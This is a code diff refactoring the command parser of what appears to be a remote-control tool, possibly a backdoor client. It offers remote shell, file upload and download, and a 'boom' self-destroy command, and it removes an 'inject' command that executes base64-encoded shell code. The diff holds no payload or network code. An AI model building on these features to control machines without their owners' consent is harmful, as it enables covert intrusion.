@@ -23,7 +23,6 @@ type UserCmd struct {
 
 const (
 	CommandBOOM       = "boom"
-	CommandINJE       = "inje"
 	CommandBASH       = "bash"
 	CommandUPLD       = "upld"
 	CommandDWLD       = "dwld"
@@ -32,7 +31,7 @@ const (
 	StatusFinishTrans = 1
 	StatusNEXISTS     = 2
 	StatusFAILED      = 3
-	StatusOtherErr    = 4
+	//StatusOtherErr    = 4
 )
 
 func printHelp() {
@@ -45,33 +44,32 @@ download <Source File Path> <Destination File Path> = Download file
 boom = Self-Destroy
 exit = Close Program
 help = Show This Message
-inject <BASE64-Encoded Code> = Execute Shell Code
 `)
 }
 
-func (ucmd *UserCmd) ParseUserInput(uipt []string) (error){
-	if len(uipt) == 1 || len(uipt) > 3{
-		switch uipt[0]{
+func ParseUserInput(uipt []string) (*UserCmd, error) {
+	var ucmd = &UserCmd{}
+	if len(uipt) == 1 || len(uipt) > 3 {
+		switch uipt[0] {
 		case CommandBASH:
 			ucmd.Cmd = CommandBASH
+			return ucmd, nil
 		case CommandBOOM:
 			ucmd.Cmd = CommandBOOM
+			return ucmd, nil
 		case CommandEXIT:
-			return errors.New("USER_EXIT")
+			return nil, errors.New("USER_EXIT")
 		case "help":
 			fallthrough
 		default:
 			printHelp()
-			return nil
+			return nil, errors.New("Unknown Err.")
 		}
 	} else if len(uipt) == 2 {
 		switch uipt[0] {
-		case "inject":
-			ucmd.Cmd = CommandINJE
-			ucmd.OptionRMT = uipt[1]
 		default:
 			printHelp()
-			return nil
+			return nil, errors.New("Unknown Err.")
 		}
 	} else {
 		switch uipt[0]{
@@ -79,16 +77,15 @@ func (ucmd *UserCmd) ParseUserInput(uipt []string) (error){
 			ucmd.Cmd = CommandDWLD
 			ucmd.OptionRMT = uipt[1]
 			ucmd.OptionLCL = uipt[2]
-			return nil
+			return ucmd, nil
 		case "upload":
 			ucmd.Cmd = CommandUPLD
 			ucmd.OptionLCL = uipt[1]
 			ucmd.OptionRMT = uipt[2]
-			return nil
+			return ucmd, nil
 		default:
 			printHelp()
-			return nil
+			return nil, errors.New("Unknown Err.")
 		}
 	}
-	return nil
 }
